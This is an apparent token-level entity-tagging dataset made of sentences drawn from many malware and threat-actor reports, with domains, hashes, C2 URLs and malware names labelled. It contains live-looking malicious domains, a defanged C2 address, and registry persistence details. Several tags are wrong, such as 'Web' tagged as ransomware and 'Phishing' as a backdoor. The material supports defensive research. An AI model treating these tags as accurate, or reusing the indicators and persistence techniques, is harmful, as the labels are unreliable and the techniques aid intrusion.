fighthard.mooo.com	B-url.unknown
-	O
5/20/2014	O
queenberry.www1.biz	B-url.unknown
-	O
10/1/2014	O
anhtuan88.ns01.biz	B-url.unknown
anhphuong85.www1.biz	B-url.unknown
word.crabdance.com	B-url.unknown
-	O
9/8/2012	O
www.fornobody.dns04.com	B-url.unknown
ftp.fornobody.dns04.com	B-url.unknown
fornobody.dns04.com	B-url.unknown
fornobody.dns04.com	B-url.unknown
-	O
9/2/2011	O
www.qwertyui.dns04.com	B-url.unknown
-	O
2/24/2012	O
www.qwertyui.dns04.com	B-url.unknown
-	O
3/3/2012	O
beyondbuck.dns1.us	B-url.unknown
letitsnowsmart.instanthq.com	B-url.unknown
prime98.jumpingcrab.com	B-url.unknown
fuck.ruouvangnhatrang.com	B-url.unknown
www.micro1.zyns.com	B-url.unknown
www.micro.zyns.com	B-url.unknown
www.micro1.zyns.com	B-url.unknown
www.qwertyui.dns04.com	B-url.unknown
-	O
3/2/2011	O
www.ollay011.zyns.com	B-url.unknown
-	O
3/4/2011	O
www.olay033.dns04.com	B-url.unknown
-	O
3/12/2011	O
www.olay044.dns04.com	B-url.unknown
-	O
4/30/2011	O
9999992009.rr.nu	B-url.unknown
9999992011.rr.nu	B-url.unknown
9999992009.myfw.us	B-url.unknown
www.qwertyui.dns04.com	B-url.unknown
-	O
3/4/2012	O
microlab.mrslove.com	B-url.unknown

We	O
assume	O
that	O
the	O
author	O
implemented	O
this	O
feature	O
because	O
several	O
targets	O
switched	O
to	O
this	O
version	O
of	O
Windows	O
in	O
2008	O
.	O

The	O
key	O
is	O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows	O
:	O
The	O
malware	O
repeatedly	O
checks	O
whether	O
this	O
entry	O
is	O
removed	O
.	O

And	O
now	O
to	O
tie	O
all	O
this	O
back	O
to	O
the	O
'	O
well-known	O
'	O
threat	O
group	O
.	O

Mobile	O

The	O
developers	O
also	O
added	O
additional	O
language	O
support	O
to	O
the	O
library	O
:	O
German	O
Spanish	O
French	O
Italian	O
Chinese	O
The	O
author	O
changed	O
the	O
backend	O
of	O
the	O
C2	O
server	O
with	O
this	O
variant	O
.	O

According	O
to	O
McAfee	O
,	O
one	O
of	O
the	O
major	O
tools	O
,	O
techniques	O
,	O
and	O
procedures	O
(	O
TTPs	O
)	O
used	O
by	O
this	O
threat	O
actor	O
was	O
their	O
use	O
of	O
obfuscated	O
or	O
encrypted	O
HTML	O
comments	O
embedded	O
in	O
otherwise	O
benign	O
websites	O
,	O
in	O
order	O
to	O
indirectly	O
control	O
compromised	O
endpoints	O
.	O

These	O
paths	O
are	O
used	O
by	O
various	O
Symantec	O
products	O
.	O

Also	O
,	O
ZhuDongFangYu.exe	O
,	O
360tray.exe	O
and	O
360sd.exe	O
process	O
names	O
are	O
used	O
by	O
security	O
products	O
that	O
originate	O
from	O
China	O
.	O

Analysis	O
of	O
this	O
malware	O
continues	O
to	O
suggest	O
that	O
a	O
sophisticated	O
effort	O
was	O
behind	O
its	O
creation	O
and	O
employment	O
.	O

CozyDuke	B-malware.drop
will	O
modify	O
the	O
registry	O
entries	O
in	O
such	O
a	O
way	O
that	O
any	O
loading	O
of	O
the	O
SharedTaskScheduler	O
COM	O
object	O
will	O
first	O
load	O
a	O
special	O
CozyDuke	B-malware.drop
module	O
that	O
will	O
ensure	O
CozyDuke	B-malware.drop
stays	O
active	O
on	O
the	O
victim	O
host	O
.	O

ACTIONABLE	O
INTELLIGENCE	O

Once	O
its	O
initialization	O
is	O
done	O
,	O
the	O
following	O
registry	O
key	O
is	O
created	O
to	O
instruct	O
the	O
backdoor	O
to	O
use	O
HTTP	O
in	O
future	O
communication	O
with	O
the	O
C	O
&	O
C	O
server	O
:	O
HKCU\SOFTWARE\Classes\	O
CLSID	O
{	O
E3517E26-8E93-458D-A6DF-8030BC80528B	O
}	O
.	O

FireEye	O
assesses	O
that	O
APT32	B-malware.infosteal
leverages	O
a	O
unique	O
suite	O
of	O
fully-featured	O
malware	O
,	O
in	O
conjunction	O
with	O
commercially-available	O
tools	O
,	O
to	O
conduct	O
targeted	O
operations	O
that	O
are	O
aligned	O
with	O
Vietnamese	O
state	O
interests	O
.	O

These	O
IP	O
addresses	O
can	O
be	O
considered	O
examples	O
–	O
they	O
change	O
regularly	O
.	O

In	O
both	O
cases	O
generation	O
is	O
based	O
on	O
the	O
MAC-address	O
and	O
computer	O
name	O
and	O
the	O
resulting	O
value	O
is	O
formatted	O
using	O
the	O
wsprintf	O
–function	O
.	O

If	O
the	O
communication	O
fails	O
,	O
ZxShell	B-malware.backdoor
disables	O
the	O
firewall	O
by	O
modifying	O
the	O
registry	O
key	O
:	O

Spam	O
Activity	O

Samples	O
in	O
yellow	O
connecting	O
to	O
C	O
&	O
C	O
hosts	O
(	O
green	O
)	O
.	O

With	O
this	O
blog	O
series	O
,	O
we	O
want	O
to	O
discuss	O
some	O
of	O
the	O
simple	O
techniques	O
and	O
tactics	O
we	O
've	O
used	O
to	O
break	O
down	O
the	O
features	O
of	O
DUBNIUM	B-malware.drop
.	O

After	O
that	O
,	O
the	O
count	O
for	O
each	O
port	O
starts	O
declining	O
sharply	O
.	O

The	O
group	O
tends	O
to	O
attack	O
different	O
companies	O
with	O
a	O
strong	O
focus	O
on	O
the	O
energy	O
and	O
industrial	O
sectors	O
.	O

After	O
using	O
the	O
one-based	O
index	O
EBX	O
to	O
pull	O
out	O
the	O
first	O
of	O
the	O
two	O
source	O
bytes	O
in	O
the	O
pair	O
,	O
it	O
adds	O

When	O
a	O
potential	O
victim	O
visits	O
the	O
link	O
,	O
they	O
are	O
offered	O
the	O
download	O
of	O
a	O
file	O
which	O
MediaFire	O
lists	O
as	O
uploaded	O
on	O
June	O
15	O
,	O
2013	O
.	O

The	O
TCIRT	O
believes	O
that	O
a	O
possible	O
theory	O
that	O
supports	O
an	O
Indian	O
attack	O
scenario	O
is	O
that	O
the	O
Telenor	O
subsidiary	O
,	O
Telenor	O
Pakistan	O
,	O
is	O
a	O
strategic	O
communications	O
infrastructure	O
provider	O
.	O

Payloads	O
are	O
detected	O
with	O
HEUR:Trojan.Win32.ScarCruft.gen	B-malware.infosteal
verdict	O
.	O

Copyright	O
©	O
2013	O
Symantec	O
Corporation	O
.	O

The	O
malicious	O
macro	O
code	O
was	O
reverse	O
engineered	O
to	O
understand	O
its	O
capabilities	O
.	O

This	O
dropper	O
will	O
then	O
proceed	O
to	O
write	O
to	O
disk	O
the	O
main	O
CozyDuke	B-malware.drop
components	O
as	O
well	O
as	O
an	O
encrypted	O
configuration	O
file	O
used	O
by	O
CozyDuke	B-malware.drop
.	O

Contact	O
DHS	O
or	O
law	O
enforcement	O
immediately	O
.	O

They	O
tested	O
the	O
detection	O
on	O
macros	O
(	O
by	O
modifying	O
them	O
,	O
or	O
by	O
executing	O
the	O
calc	O
instead	O
of	O
the	O
malicious	O
payload	O
)	O
and	O
the	O
developers	O
tried	O
dynamic	O
data	O
exchange	O
(	O
DDE	O
)	O
execution	O
in	O
the	O
Office	O
document	O
.	O

In	O
all	O
our	O
cases	O
,	O
it	O
is	O
set	O
to	O
either	O
'	O
SN0	O
'	O
or	O
'	O
SN1	O
.	O
'	O

They	O
have	O
also	O
engaged	O
in	O
aggressive	O
information	O
operations	O
in	O
the	O
media	O
.	O

Example	O
zip	O
files	O
:	O
ئلإا	O
ب	O
روعرع	O
لا	O
نا	O
ندع	O
خي	O
ش	O
لا	O
يأر	O
.zip	O

For	O
more	O
technical	O
information	O
on	O
file	O
systems	O
and	O
their	O
forensic	O
value	O
,	O
Brian	O
Carrier	O
's	O
book	O
File	O
System	O
Forensic	O
Analysis	O
is	O
an	O
invaluable	O
tool	O
.	O

Because	O
all	O
of	O
the	O
code	O
is	O
server-side	O
language	O
that	O
does	O
not	O
generate	O
client-side	O
code	O
,	O
browsing	O
to	O
the	O
Web	B-malware.ransom
shell	O
and	O
viewing	O
the	O
source	O
as	O
a	O
client	O
reveals	O
nothing	O
.	O

Before	O
the	O
service	O
is	O
started	O
ChangeServiceConfig	O
is	O
called	O
to	O
modify	O
the	O
service	O
type	O
to	O
shared	O
and	O
interactive	O
.	O

5cb6e6e0fbe87eba975b5ae0efaf2ca4	B-hash
Center14430654.dat	O
/	O
anyconnect-win-4.1.04011-web-deploy-k9.exe	O
4f4bf27b738ff8f2a89d1bc487b054a8	B-hash
Center111940519.dat	O
75d3d1f23628122a64a2f1b7ef33f5cf	B-hash
adobe.dat	O
d9821468315ccd3b9ea03161566ef18e	B-hash
'	O
unknown	O
'	O
b9af5f5fd434a65d7aa1b55f5441c90a	B-hash
adobe.dat	O

Despite	O
the	O
shell	O
being	O
written	O
in	O
PHP	O
and	O
only	O
displaying	O
a	O
simple	O
Login	O
prompt	O
,	O
it	O
is	O
easy	O
to	O
identify	O
the	O
Angel	O
webshell	O
based	O
on	O
unique	O
components	O
of	O
its	O
viewable	O
HTML	O
source	O
code	O
.	O

It	O
's	O
possible	O
that	O
Lazarus	O
is	O
using	O
tools	O
other	O
than	O
RATANKBA	B-malware.backdoor
to	O
target	O
larger	O
organizations	O
.	O

McAfee	O
Vulnerability	O
The	O
FSL/MVM	O
package	O
of	O
January	O
15	O
includes	O
a	O
vulnerability	O
check	O
to	O
assess	O
if	O
your	O
systems	O
are	O
at	O
risk	O
.	O

We	O
also	O
found	O
several	O
uploaded	O
log	O
files	O
which	O
indicate	O
the	O
presence	O
of	O
an	O
Android	O
RAT	B-malware.unknown
.	O

For	O
example	O
,	O
the	O
strings	O
'	O
LAVENDERX	B-malware.drop
'	O
and	O
'	O
LAVENDERengin	B-malware.drop
'	O
(	O
which	O
are	O
dynamically	O
built	O
on	O
the	O
stack	O
)	O
are	O
used	O
to	O
determi	O
ne	O
the	O
implant	O
's	O
version	O
.	O

Exploit	O
Document	O
Filename	O
:	O

This	O
quarterly	O
report	O
presents	O
the	O
targeted	O
attack	O
campaigns	O
observed	O
and	O
mitigated	O
by	O
Trend	O
Micro	O
based	O
on	O
reported	O
customer	O
cases	O
,	O
as	O
well	O
as	O
our	O
own	O
independently	O
gathered	O
data	O
.	O

Appendix	O
C	O
:	O
List	O
of	O
Memory	O
Offsets	O
for	O
Some	O
ZxShell	B-malware.backdoor
Functions	O
13	O
.	O

This	O
parameter	O
represents	O
a	O
hash	O
of	O
the	O
password	O
with	O
which	O
a	O
remote	O
user	O
has	O
to	O
connect	O
to	O
Team	O
Viewer	O
client	O
.	O

Right	O
from	O
the	O
start	O
,	O
the	O
group	O
stood	O
out	O
because	O
of	O
its	O
use	O
of	O
an	O
advanced	O
,	O
highly	O
automated	O
framework	O
to	O
support	O
its	O
targeted	O
attacks	O
.	O

If	O
software	O
and	O
environment	O
check	O
passes	O
,	O
the	O
first	O
stage	O
payload	O
will	O
try	O
to	O
download	O
the	O
second	O
stage	O
payload	O
from	O
the	O
command	O
and	O
control	O
(	O
C	O
&	O
C	O
)	O
server	O
.	O

In	O
other	O
words	O
,	O
it	O
will	O
convert	O
the	O
ASCII	O
representations	O
(	O
0x30	O
,	O
0x31	O
,	O
...	O
,	O
0x39	O
)	O
of	O
the	O
digits	O
0	O
through	O
9	O
into	O
their	O
equivalent	O
integer	O
representations	O
(	O
0x00	O
,	O
0x01	O
,	O
...	O
,	O
0x09	O
)	O
.	O

SHA256	O
of	O
SSL	O
certificate	O
observed	O
on	O
6535abc68a777b82b8dca49ffbf2d80af7491e76020028a3e18186e1cad02abe	B-hash
malicious	O
infrastructure	O
.	O

Value	O
subst_var_41C	O
[	O
ESI	O
]	O
...	O
253	O
254	O
255	O
0x00	O
0x01	O
0x02	O
0x03	O
0x04	O
...	O
0xFD	O
0xFE	O
0xFF	O

Figure	O
8	O
:	O
File	O
management	O
provides	O
an	O
easy-to-use	O
menu	O
that	O
is	O
activated	O
by	O
right-clicking	O
on	O
a	O
file	O
name	O

https://crt.sh/?id=482419008	B-url.cncsvr
Domain	O
associated	O
with	O
SSL	O
certificate	O
observed	O
on	O
malicious	O
infrastructure	O
.	O

IOPlatformUUID	O
0x3303	O
0x3303	O
#	O
3333	O
#	O
3344	O
#	O
3355	O
#	O
3377	O
#	O
0x16	O
Hello	O
message	O
body	O
All	O
the	O
important	O
functionalities	O
of	O
the	O
XAgent	B-malware.backdoor
lie	O
in	O
its	O
modules	O
.	O

Trend	O
Micro	O
researchers	O
discovered	O
a	O
phishing	O
email	O
sent	O
to	O
South	O
Korean	O
organizations	O
on	O
March	O
19	O
.	O

ZxShell	B-malware.backdoor
exploits	O
this	O
fact	O
by	O
cycling	O
between	O
each	O
of	O
the	O
names	O
,	O
verifying	O
the	O
existence	O
of	O
the	O
real	O
service	O
.	O

Figure	O
11	O
–	O
Listing	O
of	O
FTP	O
directory	O
containing	O
the	O
PHP	O
backdoor	O
.	O

The	O
initial	O
point	O
of	O
compromise	O
seems	O
to	O
be	O
highly	O
targeted	O
spam	O
messages	O
with	O
a	O
malicious	O
VBS	O
fi	O
le	O
attached	O
.	O

Referendum	O
on	O
Crimea/Crimean	O
annexation	O
Presidential	O
Elections	O
in	O
Ukraine	O
Malicious	O
App	O
Observed	O
in	O
Distribution	O
on	O
Forums	O

For	O
example	O
,	O
here	O
is	O
the	O
command	O
executed	O
by	O
some	O
NBOT	B-malware.drop
droppers	O
in	O
the	O
context	O
of	O
ramFS	O
:	O
As	O
a	O
final	O
indication	O
that	O
Dino	B-malware.backdoor
belongs	O
to	O
Animal	O
Farm	O
menagerie	O
,	O
it	O
is	O
noticeable	O
that	O
the	O
output	O
of	O
Dino	B-malware.backdoor
's	O
sysinfo	O
command	O
looks	O
like	O
an	O
updated	O
version	O
of	O
the	O
'	O
beacon	O
'	O
from	O
the	O
SNOWBALL	O
implant	O
described	O
in	O
the	O
leaked	O
CSE	O
slides	O
–	O
part	O
of	O
operation	O
SNOWGLOBE	O
,	O
which	O
led	O
to	O
the	O
discovery	O
of	O
Babar	B-malware.unknown
:	O

The	O
final	O
payload	O
of	O
the	O
attack	O
is	O
a	O
CAB	O
file	O
with	O
the	O
following	O
MD5	O
:	O
8844a537e7f533192ca8e81886e70fbc	B-hash
The	O
MS	O
CAB	O
file	O
(	O
md5	O
:	O
8844a537e7f533192ca8e81886e70fbc	B-hash
)	O
contains	O
4	O
malicious	O
DLL	O
files	O
:	O
Filename	O
a6f14b547d9a7190a1f9f1c06f906063	O
cfgifut.dll	O
e51ce28c2e2d226365bc5315d3e5f83e	O
cldbct.dll	O
067681b79756156ba26c12bc36bf835c	O
cryptbase.dll	O
f8a2d4ddf9dc2de750c8b4b7ee45ba3f	O
msfte.dll	O
The	O
file	O
cldbct.dll	O
(	O
e51ce28c2e2d226365bc5315d3e5f83e	O
)	O
connects	O
to	O
the	O
following	O
C2	O
:	O
hXXp://webconncheck.myfw[.]us:8080/8xrss.php	O
The	O
modules	O
are	O
signed	O
by	O
an	O
invalid	O
digital	O
certificates	O
listed	O
as	O
'	O
Tencent	O
Technology	O
(	O
Shenzhen	O
)	O
Company	O
Limited	O
'	O
with	O
serial	O
numbers	O
,	O
copied	O
from	O
real	O
Tencent	O
certificates	O
:	O
5d	O
06	O
88	O
f9	O
04	O
0a	O
d5	O
22	O
87	O
fc	O
32	O
ad	O
ec	O
eb	O
85	O
b0	O
71	O
70	O
bd	O
93	O
cf	O
3f	O
18	O
9a	O
e6	O
45	O
2b	O
51	O
4c	O
49	O
34	O
0e	O

Tranchulas	O
also	O
serves	O
as	O
an	O
official	O
sponsor	O
for	O
the	O
Pakistan	O
CERT	O
in	O
addition	O
to	O
maintaining	O
the	O
official	O
Pakistan	O
CERT	O
website	O
(	O
cert.org.pk	O
)	O
.	O

As	O
shown	O
In	O
Figure	O
25	O
,	O
the	O
Fiddler	O
Web	O
debugger	O
text	O
wizard	O
easily	O
converts	O
the	O
raw	O
traffic	O
from	O
Base64	O
to	O
plain	O
text	O
.	O

In	O
this	O
case	O
the	O
picture	O
contains	O
photos	O
of	O
members	O
of	O
the	O
Ethiopian	O
opposition	O
group	O
,	O
Ginbot	O
7	O
.	O

The	O
attacker	O
used	O
a	O
domain	O
which	O
allowed	O
them	O
to	O
try	O
and	O
fool	O
the	O
user	O
.	O

In	O
other	O
words	O
,	O
Komplex	B-malware.backdoor
is	O
an	O
APT28/Sofacy	O
component	O
that	O
can	O
be	O
distributed	O
via	O
email	O
,	O
disguised	O
as	O
a	O
PDF	O
document	O
,	O
to	O
establish	O
a	O
foothold	O
in	O
a	O
system	O
.	O

Three	O
types	O
of	O
operating	O
systems	O
were	O
used	O
for	O
testing	O
purposes	O
;	O
all	O
testing	O
occurred	O
on	O
laptops	O
.	O

Figure	O
18	O
:	O
Contents	O
of	O
Dropped	O
VBS	O
File	O

An	O
engineering	O
company	O
that	O
designs	O
electrical	O
substations	O
,	O
gas	O
distribution	O
pipelines	O
,	O
and	O
water	O
supply	O
plants	O
.	O

However	O
,	O
it	O
is	O
unusual	O
that	O
a	O
full	O
SPLM	B-malware.backdoor
backdoor	O
was	O
not	O
detected	O
on	O
this	O
system	O
,	O
nor	O
was	O
any	O
powershell	O
loader	O
script	O
.	O

.SYSTEM\CurrentControlSet\Services\zhudongfangyu	O
.	O

Fiddler	O
needs	O
this	O
to	O
be	O
converted	O
to	O
an	O
equal	O
sign	O
for	O
proper	O
decoding	O
.	O
)	O

An	O
interesting	O
feature	O
of	O
this	O
exact	O
XtremeRat	B-malware.backdoor
is	O
that	O
it	O
is	O
digitally	O
signed	O
–	O
seemingly	O
by	O
Microsoft	O
:	O
The	O
certificate	O
chain	O
ends	O
in	O
an	O
untrusted	O
(	O
faked	O
)	O
root	O
certificate	O
;	O
so	O
it	O
will	O
not	O
validate	O
properly	O
.	O

Gather	O
network	O
addresses	O
and	O
operating	O
system	O
version	O
Execute	O
arbitrary	O
commands	O
using	O
'	O
cmd.exe	O
/c	O
'	O
The	O
capability	O
to	O
execute	O
system	O
commands	O
.	O

Figure	O
6	O
-	O
Signature	O
Verified	O
by	O
VirusTotal	O
The	O
Cisco	O
AnyConnect	O
,	O
'	O
vpnui.exe	O
'	O
,	O
appears	O
to	O
be	O
a	O
legitimate	O
application	O
signed	O
by	O
Cisco	O
with	O
the	O
following	O
digital	O
signature	O
details	O
:	O

To	O
combat	O
threats	O
,	O
root9B	O
realized	O
that	O
technology	O
is	O
not	O
the	O
problem	O
.	O

\HKCU\SOFTWARE\Classes\AppX	O
[	O
a-f0-9	O
]	O
{	O
32	O
}	O
,	O
which	O
is	O
quite	O
generic	O
.	O

The	O
hashes	O
are	O
hardcoded	O
within	O
the	O
binary	O
,	O
and	O
will	O
be	O
compared	O
to	O
hashed	O
library	O
exports	O
by	O
the	O
API	O
resolution	O
routine	O
.	O

The	O
Freegate	B-malware.infosteal
software	O
begins	O
operating	O
,	O
and	O
quickly	O
prompts	O
the	O
user	O
for	O
an	O
update	O
.	O

Version	O
1.0	O
–	O
23/11/2015	O
All	O
Rights	O
Reserved	O
To	O
Minerva	O
Labs	O
LTD	O
and	O
ClearSky	O
Cyber	O
Security	O
,	O
2015	O
Executive	O
Summary	O
.........................................................................................................................	O
3	O
The	O
Group	O
Attack	O
Cycle	O
...................................................................................................................	O
4	O
Step	O
One	O
–	O
Spear	O
Phishing	B-malware.backdoor
...........................................................................................................	O
4	O
Step	O
Two	O
-	O
Droppers	B-malware.unknown
Matryoshka	I-malware.unknown
................................................................................................	O
6	O
Dropper	O
–	O
SCR	O
PE	O
File	O
..............................................................................................................	O
6	O
Step	O
Three	O
-	O
Reflective	O
Loader	O
....................................................................................................	O
8	O
Step	O
Four	O
-	O
RAT	O
Component	O
......................................................................................................	O
10	O
Runtime	O
API	O
Address	O
Resolution	O
...........................................................................................	O
10	O
Installation	O
and	O
Persistence	O
..................................................................................................	O
10	O
DNS	O
Command	O
&	O
Control	O
......................................................................................................	O
11	O
Common	O
RAT	O
Capabilities	O
.........................................................................................................	O
13	O
Improvement	O
Over	O
Time	O
...........................................................................................................	O
15	O
About	O
Us	O
....................................................................................................................................	O
16	O
Minerva	O
Labs	O
.........................................................................................................................	O
16	O
ClearSky	O
Cyber	O
Security	O
.........................................................................................................	O
16	O
Appendix	O
A	O
–	O
Spear	O
Phishing	B-malware.backdoor
Examples	O
.........................................................................................	O
17	O
Appendix	O
B	O
–	O
Indicators	O
of	O
Compromise	O
.......................................................................................	O
20	O
The	O
Middle	O
East	O
has	O
been	O
a	O
cyber	O
warfare	O
hotspot	O
for	O
almost	O
a	O
decade	O
now	O
,	O
a	O
theatre	O
for	O
some	O
of	O
the	O
most	O
advanced	O
threats	O
the	O
world	O
has	O
ever	O
witnessed	O
.	O

Some	O
hashes	O
of	O
the	O
backdoor	O
have	O
been	O
provided	O
in	O
BadCyber	O
's	O
technical	O
analysis	O
:	O

5353	O
'	O
.	O

This	O
backdoor	O
also	O
has	O
functionality	O
to	O
load	O
additional	O
plugins	O
from	O
the	O
command	O
and	O
control	O
server	O
.	O

As	O
in	O
previous	O
cases	O
,	O
the	O
attackers	O
still	O
serve	O
copied	O
content	O
on	O
IPs	O
,	O
domains	O
and	O
hosts	O
they	O
control	O
.	O

On	O
17	O
July	O
2010	O
,	O
ESET	O
detected	O
another	O
driver	O
'	O
in	O
the	O
wild	O
'	O
-	O
jmidebs.sys	O
-	O
which	O
was	O
very	O
similar	O
to	O
the	O
already	O
known	O
mrxcls.sys	O
,	O
but	O
had	O
been	O
created	O
just	O
three	O
days	O
before	O
it	O
was	O
discovered	O
.	O

InfoOS	O
InfoOS	O
ScreenShot	O
ScreenShot	O
ScreenShot	O
Password	O

APT12	O
has	O
previously	O
used	O
the	O
THREEBYTE	B-malware.backdoor
backdoor	O
.	O

Example	O
of	O
YouTube	O
video	O
shown	O
to	O
victim	O
:	O
While	O
the	O
victim	O
sees	O
the	O
decoy	O
YouTube	O
video	O
or	O
news	O
website	O
,	O
a	O
php	O
file	O
(	O
g.php	O
)	O
that	O
contains	O
a	O
hex-encoded	O
malicious	O
binary	O
is	O
fetched	O
.	O

Said	O
object	O
is	O
configured	O
to	O
grab	O
keyboard	O
events	O
through	O
GetRawInputData	O
.	O

1	O
*	O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789	O
$	O
~	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
is	O
a	O
simple	O
backdoor	O
in	O
terms	O
of	O
components	O
.	O

Access	O
to	O
this	O
mail	O
by	O
anyone	O
else	O
is	O
unauthorised	O
.	O

ANEL	B-malware.backdoor
will	O
send	O
the	O
infected	O
environment	O
's	O
information	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
is	O
stealthy	O
due	O
to	O
a	O
number	O
of	O
factors	O
,	O
including	O
the	O
following	O
:	O
•	O
Size	O
•	O
Server-side	O
content	O
•	O
Client-side	O
content	O
•	O
AV	O
detection	O
rate	O
(	O
or	O
lack	O
thereof	O
)	O
Malicious	O
and	O
benign	O
software	O
usually	O
suffers	O
from	O
the	O
same	O
principle	O
:	O
more	O
features	O
equals	O
more	O
code	O
,	O
which	O
equals	O
larger	O
size	O
.	O

These	O
compromises	O
were	O
discovered	O
following	O
the	O
identification	O
of	O
malicious	O
JavaScript	O
that	O
had	O
been	O
added	O
to	O
legitimate	O
code	O
on	O
the	O
impacted	O
websites	O
.	O

root9B	O
operators	O
and	O
software	O
developers	O
designed	O
and	O
constructed	O
proprietary	O
methods	O
of	O
discovering	O
and	O
dealing	O
with	O
adversaries	O
.	O

This	O
malware	O
provides	O
the	O
attacker	O
with	O
clandestine	O
remote	O
access	O
to	O
the	O
victim	O
's	O
machine	O
as	O
well	O
as	O
comprehensive	O
data	O
harvesting	O
and	O
exfiltration	O
capabilities	O
.	O

Ablyazov	O
's	O
son-in-law	O
and	O
his	O
attorney	O
and	O
linked	O
with	O
this	O
campaign	O
were	O
variants	O
of	O
the	O
HackBack	B-malware.unknown
Trojan	O
.	O

For	O
example	O
,	O
address	O
0x142C11C	O
has	O
an	O
instruction	O
that	O
loads	O
an	O
encoded	O
string	O
which	O
is	O
decoded	O
as	O
'	O
.	O

FireEye	O
researchers	O
also	O
discovered	O
two	O
possibly	O
related	O
campaigns	O
utilizing	O
two	O
other	O
backdoors	O
known	O
as	O
THREEBYTE	B-malware.backdoor
and	O
WATERSPOUT	B-malware.backdoor
.	O

Table	O
2	O
highlights	O
incidents	O
in	O
which	O
victims	O
suffered	O
a	O
compromise	O
that	O
FireEye	O
iSIGHT	O
Intelligence	O
,	O
other	O
authorities	O
,	O
or	O
the	O
victims	O
themselves	O
later	O
attributed	O
to	O
the	O
group	O
we	O
track	O
as	O
APT28	B-malware.infosteal
.	O

However	O
,	O
the	O
WATERSPOUT	B-malware.backdoor
campaign	O
shared	O
several	O
traits	O
with	O
the	O
RIPTIDE	B-malware.backdoor
and	O
HIGHTIDE	B-malware.backdoor
campaign	O
that	O
we	O
have	O
attributed	O
to	O
APT12	O
.	O

Name	O

IRONGATE	B-malware.backdoor
detects	O
malware	O
detonation/observation	O
environments	O
,	O
whereas	O
Stuxnet	O
looked	O
for	O
the	O
presence	O
of	O
antivirus	O
software	O
.	O

substituted	O
with	O
the	O
local	O
machine	O
IP	O
address	O
to	O
achieve	O
code	O
execution	O
on	O
the	O
system	O
.	O

hXXp://niggmhggmeggmkggmfggmdggidggngggmjgg.ijhlokga.aisicoin[.]com/	B-url.unknown
13/139756-Ses-Ufali-L	I-url.unknown

One	O
is	O
an	O
article	O
about	O
Pakistan	O
's	O
indigenous	O
UAV	O
industry	O
which	O
is	O
attributed	O
to	O
author	O
Aditi	O
Malhotra	O
,	O
an	O
Indian	O
writer	O
and	O
Associate	O
Fellow	O
at	O
the	O
Centre	O
for	O
Land	O
Warfare	O
Studies	O
(	O
CLAWS	O
)	O
in	O
New	O
Delhi	O
.	O

'	O
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6.exe	O
'	O

Figure	O
9	O
.	O

FireEye	O
,	O
Inc	O
.	O

관리	O
서버를	O
이용한	O
공격의	O
경우	O
,	O
공격자는	O
공격	O
대상의	O
관리자	O
페이지	O
계정을	O
탈취하여	O
정상	O
파일	O
대신	O
악성코드를	O
배포할	O
수	O
있다	O
.	O

$	O
interval	O
$	O
downloadexec	O
파일	O
다운로드	O
후	O
실행	O
$	O
download	O
파일	O
다운로드	O
(	O
기본	O
)	O
Cmd.exe	O
실행	O
[	O
표	O
2	O
]	O
Rifdoor	B-malware.backdoor
주요	O
명령	O
Rifdoor	B-malware.backdoor
변형은	O
[	O
표	O
3	O
]	O
과	O
같이	O
PDB	O
정보가	O
조금씩	O
다르다	O
.	O

If	O
access	O
to	O
this	O
service	O
is	O
required	O
,	O
it	O
should	O
be	O
permitted	O
only	O
for	O
those	O
IP	O
's	O
that	O
require	O
access	O
.	O

SHOOTING	O
ELEPHANTS	O
....................................................................................	O
4	O
2	O
.	O

The	O
client	O
binary	O
is	O
packed	O
with	O
UPX	O
and	O
is	O
220,672	O
bytes	O
in	O
size	O
,	O
as	O
shown	O
in	O
Figure	O
1	O
.	O

The	O
'	O
lremit_Transfer_Error_Page.jar	B-malware.infosteal
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

The	O
domains	O
listed	O
in	O
the	O
Detect	O
section	O
represent	O
a	O
signifi	O
cant	O
set	O
of	O
those	O
currently	O
known	O
to	O
be	O
operating	O
.	O

Also	O
you	O
can	O
decrypt	O
3	O
files	O
for	O
test	O
.	O

The	O
collection	O
of	O
such	O
tactical	O
artillery	O
force	O
positioning	O
intelligence	O
by	O
FANCY	O
BEAR	O
further	O
supports	O
CrowdStrike	O
's	O
previous	O
assessments	O
that	O
FANCY	O
BEAR	O
is	O
likely	O
affiliated	O
with	O
the	O
Russian	O
military	O
intelligence	O
(	O
GRU	O
)	O
,	O
and	O
works	O
closely	O
with	O
Russian	O
military	O
forces	O
operating	O
in	O
Eastern	O
Ukraine	O
and	O
its	O
border	O
regions	O
in	O
Russia	O
.	O

Here	O
,	O
the	O
contents	O
of	O
the	O
PHP	O
version	O
are	O
just	O
as	O
minimalistic	O
.	O

This	O
malicious	O
Word	O
document	O
had	O
an	O
MD5	O
of	O
499bec15ac83f2c8998f03917b63652e	B-hash
and	O
dropped	O
a	O
backdoor	O
to	O
C	O
:	O
\DOCUMENTS	O
and	O
SETTINGS\	O
{	O
user	O
}	O
\LOCAL	O
SETTINGS\Temp\word.exe	O
.	O

Unkno	O
wn	O
Unkno	O
wn	O

Sleep	O
For	O
:	O
10.100000	O
Minutes	O
!	O
,	O
indicating	O
that	O
the	O
C2	O
sever	O
can	O
not	O
be	O
reached	O
and	O
the	O
malware	O
will	O
sleep	O
for	O
a	O
fixed	O
amount	O
of	O
time	O
.	O

USB	O
File	O
Collector	O
:	O
Searches	O
for	O
variety	O
of	O
file	O
types	O
on	O
USB	O
drives	O
(	O
including	O
doc	O
,	O
docx	O
,	O
xls	O
,	O
xlsx	O
,	O
ppt	O
,	O
pptx	O
,	O
pdf	O
,	O
zip	O
,	O
rar	O
,	O
db	O
,	O
txt	O
)	O
.	O

ARMED	O
CONFLICT	O
IN	O
UKRAINE	O

2017	O
.	O

Web	O
.	O

Web	O
.	O

The	O
link	O
appears	O
to	O
have	O
been	O
made	O
from	O
the	O
use	O
of	O
the	O
DerUsbi	B-malware.infosteal
malware	O
family	O
though	O
,	O
which	O
we	O
know	O
to	O
be	O
used	O
by	O
several	O
espionage	O
actors	O
.	O

http://www.symantec.com/security_response/earthlink_writeup.jsp?docid=2015-040923-3643-99	B-url.normal
